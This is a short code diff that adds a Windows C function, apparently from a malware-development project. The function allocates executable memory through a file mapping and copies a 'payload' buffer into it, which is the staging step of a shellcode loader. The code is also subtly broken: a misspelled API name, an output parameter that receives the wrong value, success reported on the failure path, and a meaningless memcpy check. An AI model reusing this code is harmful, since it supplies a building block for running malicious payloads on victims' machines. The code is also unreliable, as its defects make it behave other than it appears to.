@@ -642,3 +642,40 @@ LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
 	return FetchFileArrayW(pPath);
 }
  
+BOOLEAN MapLocalMemory
+(
+	IN     PUCHAR  pPayload,
+	   OUT PUCHAR *pMappedAddress,
+	   OUT SIZE_T  sPayloadSize,
+	   OUT PHANDLE phFileMappingHandle 
+)
+{
+	if (!phFileMappingHandle) return FALSE;
+	
+	BOOLEAN bState = FALSE;
+	
+	PUCHAR pMappingAddress;
+	
+
+	HANDLE hFile = CreateFileMappingW(
+		INVALID_HANDLE_VALUE,
+		NULL,
+		PAGE_EXECUTE_WRITECOPY,
+		NULL,
+		sPayloadSize,
+		NULL
+	);
+
+	if(!(pMappingAddress = MapViewOFFile(
+		hFile, 
+		FILE_MAP_WRITE | FILE_MAP_EXECUTE,
+		NULL, NULL, 
+		sPayloadSize
+	))) goto cleanup;
+	
+	if(!memcpy(pMappingAddress, pPayload, sPayloadSize)) return FALSE;
+	cleanup:
+	if (hFile) CloseHandle(hFile);
+	*pMappedAddress = phFileMappingHandle;
+	return TRUE;
+}
